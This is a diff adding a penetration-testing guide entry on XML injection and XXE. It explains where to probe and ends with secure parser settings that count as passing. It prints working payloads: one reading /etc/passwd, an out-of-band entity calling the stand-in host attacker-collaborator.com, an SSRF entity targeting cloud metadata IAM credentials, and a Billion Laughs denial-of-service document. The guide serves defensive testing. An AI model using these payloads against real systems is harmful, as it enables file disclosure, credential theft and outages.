@@ -1,0 +1,70 @@
+WSTG-INPV-07: Testing for XML Injection / XML External Entity (XXE)
+
+Summary:
+XML injection occurs when user data is embedded in XML without proper encoding, allowing manipulation of the XML structure. XXE is a specific form where DOCTYPE declarations reference external entities, causing the parser to fetch and embed external resources. XXE can lead to local file disclosure, SSRF, and denial of service.
+
+Test Objectives:
+- Identify application endpoints that parse user-supplied XML
+- Test whether the XML parser processes DOCTYPE declarations and external entities
+- Assess accessible internal resources and files
+
+How to Test:
+
+1. Identify XML Processing Points
+   - Endpoints accepting Content-Type: application/xml or text/xml
+   - SOAP web services
+   - File upload endpoints accepting XML, SVG, DOCX, XLSX (all ZIP-based XML formats)
+   - REST endpoints accepting JSON that may internally convert to XML
+   - Configuration import/export features
+
+2. Basic XXE Test - File Disclosure
+   Submit this payload in any XML parameter:
+   ```xml
+   <?xml version="1.0"?>
+   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+   <foo>&xxe;</foo>
+   ```
+   If /etc/passwd contents appear in the response, XXE is confirmed.
+
+3. Blind XXE - Out-of-Band (OOB) Detection
+   For applications that don't reflect entity values:
+   ```xml
+   <?xml version="1.0"?>
+   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker-collaborator.com/xxe">]>
+   <foo>&xxe;</foo>
+   ```
+   Monitor for outbound HTTP requests to confirm the parser fetches external URLs.
+
+4. XXE via SSRF
+   ```xml
+   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
+   ```
+   Access cloud metadata endpoints to retrieve IAM credentials.
+
+5. Denial of Service - Billion Laughs
+   ```xml
+   <?xml version="1.0"?>
+   <!DOCTYPE lolz [
+     <!ENTITY lol "lol">
+     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+   ]>
+   <lolz>&lol3;</lolz>
+   ```
+
+6. SVG and DOCX Upload Testing
+   - Create a malformed SVG with embedded XXE payload
+   - Upload to avatar, image, or document import endpoints
+   - Observe server response for file content or timing differences
+
+Tools:
+   - Burp Suite Collaborator: OOB XXE detection
+   - XXEinjector: automated XXE exploitation tool
+   - Custom Burp extensions for XXE scanning
+
+Expected Secure Behavior (Pass Conditions):
+- XML parser has DOCTYPE processing disabled (disallow-doctype-decl feature enabled)
+- External entity processing disabled for all XML parsers
+- User-supplied XML parsed in a restricted environment without network access
+- Application returns generic errors without revealing XML parser details
+- SVG and XML file uploads are validated and processed with secure parser configuration
